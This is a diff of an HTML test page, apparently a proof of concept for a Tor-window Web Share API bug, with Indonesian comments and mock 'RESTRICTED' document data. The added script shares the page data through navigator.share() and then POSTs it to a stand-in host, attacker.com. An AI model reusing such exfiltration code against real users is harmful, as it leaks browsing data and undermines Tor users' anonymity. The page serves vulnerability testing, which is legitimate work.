@@ -1,80 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sensitive Banking Site</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Tor Document</title>
 </head>
 <body>
-    <div style="padding: 20px; font-family: Arial;">
-        <h2>Private Banking Portal</h2>
-        <p>Welcome to your secure banking session. This page contains sensitive financial information.</p>
+    <div id="content">
+        <h1>Confidential Document</h1>
+        <p>This is sensitive information only meant for Tor browsing.</p>
+        <p><strong>Document ID:</strong> TOR-INTERNAL-2024-001</p>
+        <p><strong>Classification:</strong> RESTRICTED</p>
         
-        <div id="sensitiveData" style="background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 5px;">
-            <h3>Account Summary</h3>
-            <p><strong>Account Holder:</strong> John Doe</p>
-            <p><strong>Account Number:</strong> XXXX-XXXX-1234</p>
-            <p><strong>Balance:</strong> $25,430.75</p>
-            <p><strong>Recent Transactions:</strong></p>
-            <ul>
-                <li>Transfer to Jane Smith - $500.00</li>
-                <li>Amazon Purchase - $89.99</li>
-                <li>Salary Deposit - $4,200.00</li>
-            </ul>
-        </div>
-
-        <div style="margin-top: 20px;">
-            <h3>External Links (Right-click → "Open in New Private Window")</h3>
-            <a href="https://google.com" target="_blank" style="display: block; margin: 10px 0;">
-                Public Forum Discussion
-            </a>
-            <a href="https://google.com" target="_blank" style="display: block; margin: 10px 0;">
-                News Article with Sensitive Info
-            </a>
-        </div>
+        <button onclick="shareSensitiveData()">Share Document Summary</button>
     </div>
 
     <script>
-        // Track if page is loaded in private browsing mode
-        function checkPrivacyContext() {
-            // Method to detect private browsing (may vary by browser)
-            const isPrivate = window.webkitRequestFileSystem ? 
-                new Promise(resolve => {
-                    window.webkitRequestFileSystem(0, 1, 
-                        () => resolve(false), 
-                        () => resolve(true)
-                    );
-                }) : Promise.resolve(false);
+        function shareSensitiveData() {
+            // Data sensitif yang seharusnya tidak bisa di-share dari Tor window
+            const sensitiveData = {
+                documentId: 'TOR-INTERNAL-2024-001',
+                classification: 'RESTRICTED',
+                content: 'Operational details for upcoming network maintenance',
+                accessLevel: 'TOR-ONLY',
+                timestamp: new Date().toISOString()
+            };
 
-            isPrivate.then(privateMode => {
-                if (!privateMode) {
-                    console.warn('⚠️ PRIVACY LEAK: Sensitive content loaded in normal browsing mode');
-                    document.getElementById('sensitiveData').style.border = '2px solid red';
-                    
-                    // Log the privacy violation
-                    const leakData = {
-                        type: 'privacy_leak',
-                        url: window.location.href,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        expected: 'private_browsing',
-                        actual: 'normal_browsing'
-                    };
-                    
-                    // In real scenario, this would be reported to security team
-                    console.log('Privacy Violation Detected:', leakData);
-                }
-            });
+            // Exploit: navigator.share() seharusnya disabled di Tor windows
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Tor Internal Document',
+                    text: `Document ${sensitiveData.documentId} - ${sensitiveData.content}`,
+                    url: window.location.href
+                })
+                .then(() => {
+                    console.log('✅ SENSITIVE DATA SHARED FROM TOR WINDOW!');
+                    // Log ke server attacker bahwa data berhasil dibocorkan
+                    fetch('https://attacker.com/log-tor-leak', {
+                        method: 'POST',
+                        body: JSON.stringify(sensitiveData),
+                        mode: 'no-cors'
+                    });
+                })
+                .catch(error => {
+                    console.log('Share failed:', error);
+                });
+            } else {
+                alert('Web Share API not supported in this Tor context (EXPECTED BEHAVIOR)');
+            }
         }
 
-        // Check on page load
-        document.addEventListener('DOMContentLoaded', checkPrivacyContext);
-        
-        // Also check when page becomes visible (tab switch)
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                checkPrivacyContext();
+        // Auto-detect jika di Tor context dan coba exploit
+        function checkTorContext() {
+            // Deteksi sederhana Tor context (bisa dengan checking .onion domain dll)
+            if (window.location.hostname.includes('.onion') || 
+                document.referrer.includes('.onion')) {
+                
+                console.log('🔓 Tor Context Detected - Testing share() vulnerability');
+                
+                // Coba trigger share setelah page load
+                setTimeout(() => {
+                    if (navigator.share) {
+                        console.log('⚠️ VULNERABLE: navigator.share() available in Tor window');
+                        document.getElementById('content').innerHTML += 
+                            '<p style="color:red">SECURITY WARNING: Share API should be disabled in Tor!</p>';
+                    }
+                }, 2000);
             }
-        });
+        }
+
+        // Jalankan check saat page load
+        checkTorContext();
     </script>
 </body>
 </html>
